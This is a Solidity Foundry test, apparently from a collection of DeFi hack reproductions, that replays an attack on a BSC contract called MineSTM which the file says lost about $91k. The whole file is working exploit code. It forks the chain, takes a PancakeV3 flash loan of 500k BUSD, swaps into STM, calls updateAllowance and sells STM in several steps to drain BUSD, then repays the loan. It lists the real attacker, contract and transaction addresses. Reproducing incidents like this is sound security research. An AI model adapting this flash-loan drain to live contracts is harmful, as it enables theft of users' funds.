// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$91k
// Attacker : https://bscscan.com/address/0xb2d546547168f61debf0a780210b5591e4dd39a8
// Attack Contract : https://bscscan.com/address/0xa4fd1beac3b5fb78a8ec074338152100b87437a9
// Vulnerable Contract : https://bscscan.com/address/0xb7d0a1adafa3e9e8d8e244c20b6277bee17a09b6
// Attack Tx : https://bscscan.com/tx/0x40f3bdd0a3a8d0476ae6aa2875dc2ec60b80812e2a394b67a88260df57c65522

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xb7d0a1adafa3e9e8d8e244c20b6277bee17a09b6#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

interface IMineSTM {
    function updateAllowance() external;
    function sell(uint256 amount) external;
}

interface ICake_LP {
    function sync() external;
}

contract SteamSwap is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 39_381_373;

    address internal constant Cake_LP = 0x2E45AEf311706e12D48552d0DaA8D9b8fb764B1C;
    address internal constant PancakeV3Pool = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address internal constant PancakeRouter = 0x0ff0eBC65deEe10ba34fd81AfB6b95527be46702;
    address internal constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant STM = 0xBd0DF7D2383B1aC64afeAfdd298E640EfD9864e0;
    address internal constant MineSTM = 0xb7D0A1aDaFA3e9e8D8e244C20B6277Bee17a09b6;


    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(BUSD);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        ICake_LP(Cake_LP).sync();
        uint256 amount0 = 500_000_000_000_000_000_000_000;
        IPancakeV3PoolActions(PancakeV3Pool).flash(address(this), amount0, 0, "");
    }

    function pancakeV3FlashCallback(uint256, uint256, bytes memory) external {
        IERC20(BUSD).approve(PancakeRouter, type(uint256).max);
        
        uint256 balance = IERC20(BUSD).balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = BUSD;
        path[1] = STM;
        IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balance,
            0,
            path,
            address(this),
            1_717_695_757
        );
        IMineSTM(MineSTM).updateAllowance();
        IERC20(STM).approve(MineSTM, type(uint256).max);

        IMineSTM(MineSTM).sell(788_457_284_784_675_531_947_146);
        IMineSTM(MineSTM).sell(58_404_243_317_383_372_736_827);
        IMineSTM(MineSTM).sell(4_326_240_245_732_101_684_211);
        IMineSTM(MineSTM).sell(32_046_224_042_460_012_475);

        IERC20(BUSD).transfer(PancakeV3Pool, 500_050_000_000_000_000_000_000);
    }
}
